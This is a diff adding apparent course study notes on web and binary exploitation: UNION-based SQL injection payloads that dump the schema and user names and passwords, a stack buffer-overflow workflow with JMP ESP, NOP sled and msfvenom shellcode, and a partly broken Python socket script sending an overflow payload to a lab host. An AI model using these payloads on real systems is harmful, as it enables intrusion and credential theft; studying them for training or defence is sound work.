@@ -53,5 +53,117 @@
                                    Web Exp day 2 (sql injection)
 ================================================================================ 
   Get method
+  1)  ID vuln  field
+      OR 1=1
+  2)  ID amount of columns
+    UNION select 1,2,3 #
+  3)  create golden statement
+    ;UNION select @@version,2,table_schema,
+    table_name,column_name FROM
+    information_schema.columns; #
+      pulls entire database
+      pulls flags from session column
+      2 is a hidden coluumn, 1 is used as a filler item to bring
+      column number up to 5 since that is the number of columns needed.
+  4)  mod statement for starget
+    <item> UNION SELECT 1,2,name,pass,id FROM
+    session.user;#
+  3 columns
   Post method
+  1)  id vuln field
+    inputbox: <item> ' OR 1='1
+  2)  Id the number of columns:
+    input box:  <item> 'UNION select 1.2.3#
+      increase number until you do not recieve an error
+  3)  create golden statement:
+    input box:  audi 'UNION select @@version,2,table_schema, table_name. column_name FROM
+    information_schema.columns; #
+      pull entire database
+      pull flags from session column
+      2 is a hidden column, 1 is used as a filer item to bring column number up to 5 since that is the number of columns needed.
+  4) modify statement for target:
+    input box:  <item> 'UNION SELECT 1,2,name,pass,id
+                FROM session.user;#
+                                     EXPLOITION DEVELOPMENT
+================================================================================ 
+  1)  static analysis
+    a. strings <filename>
+  2)  Behavioral
+    a.  run it
+  3)  Dynamic
+    1)  ID if parameter or userinput
+      Parameter
+        ./<program>$(echo 'insert command')
+        Userinput
+        ./<program><<<<$(echo 'insert command')
+    2)  make python script
+    3)  break in with 'A'
+    4) GDB
+      GDB ./<program name>
+        shell gives back terminal
+        exit goes back to gdb
+          if files doesint load type file <filename>
+     5)  info functions to view function calls - find bad function call
+        info proc map
+        get, strcpy, strcat, sprintf
+      6)  Run <<<$(python <script name>)
+      7)  Look up EIP
+      8)  Pull up WireMask
+        Generate pseudo-random string
+        take eip register put into wiremask
+        take offset # and add it to script a offset
+      9)  find JMPESP
+        env -gdb ./<.exe name>
+        unset env lines
+        unset env columns
+      10)  run <.exe>
+        first address bellow heap line
+        last address on stack line
+      11)  find /b <First head>, <Last Stack>, 0xff, 0xe4
+        convert to little endian
+      12)  replace "B" values in EIP variable with JMPESP
+      13)  Add NOP sled (\x90)
+      14)  Generate Shellcode
+        run of gdb
+        msfvenom -p linux/x86/exec CMD=<command you want to run> -b
+        "\x00\xfe\x20\x0a\xff" -f python
+                        WINDOWS EXPLOITATION
+================================================================================
+1)  Static
+  springs <filname>
+2)  Behavioral Analysis
+  a)  netstat -anop tcp
+  b)  nc <ip> <port>
+  c)  rinse Immunity
+    i.  Restart program
+    ii.  check windows security settings
+    iii.  play the program
+  d.  immunity debugger
+    i.  make sure program is running in bottom right
+    ii.  script for win buffoverflow
 
+    #!/usr/bin/python
+    import socket 
+
+    buf="TRUN/.:/"
+    #buf += "A"*5000
+    buf += "sudo random string"
+    buf += "BBBB"
+    buf += '\xAF\x11\x50\x62'
+    buf +="
+    s=socket.socket(socket.AF_INET,
+    socket.SOCK_STREAM)
+    s.connect(("10.50.136.46",9999))
+    print s.recv(1024)
+    s.send(buf)
+    print s.recv(1024)
+
+    s.close()
+
+    JMPESP locations
+      !mona modules - find the one with all falses
+      !mona jmp -r esp -m "essfunc.dll" --change
+      window to (Win)
+    
+
+      
